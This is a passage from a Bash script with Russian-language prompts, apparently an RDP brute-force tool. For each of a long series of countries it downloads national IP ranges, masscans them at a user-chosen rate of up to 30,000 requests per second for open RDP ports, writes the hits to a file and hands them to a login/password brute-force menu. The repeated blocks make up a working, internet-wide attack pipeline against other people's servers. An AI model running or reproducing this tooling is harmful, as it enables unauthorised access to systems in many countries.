echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "154" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ROMANIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Romania://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "155" ]; then
curl http://services.ce3c.be/ciprg/?countrys=RUSSIAN+FEDERATION |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Russian Federation://g" |sed '$d'>list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "156" ]; then
curl http://services.ce3c.be/ciprg/?countrys=RWANDA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Rwanda://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "157" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SAINT+KITTS+AND+NEVIS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Saint Kitts and Nevis://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "158" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SAINT+LUCIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Saint Lucia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "159" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SAMOA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Samoa://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "160" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SAN+MARINO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/San Marino://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "161" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SAUDI+ARABIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Saudi Arabia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "162" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SENEGAL |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Senegal://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "163" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SERBIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Serbia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "164" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SEYCHELLES |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Seychelles://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "165" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SIERRA+LEONE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Sierra Leone://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "166" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SINGAPORE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Singapore://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "167" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SLOVAKIA+%28SLOVAK+REPUBLIC%29 |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Slovakia (SLOVAK Republic)://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "168" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SLOVENIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Slovenia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "169" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SOLOMON+ISLANDS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Solomon Islands://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "170" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SOUTH+AFRICA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/South Africa://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "171" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SPAIN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Spain://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





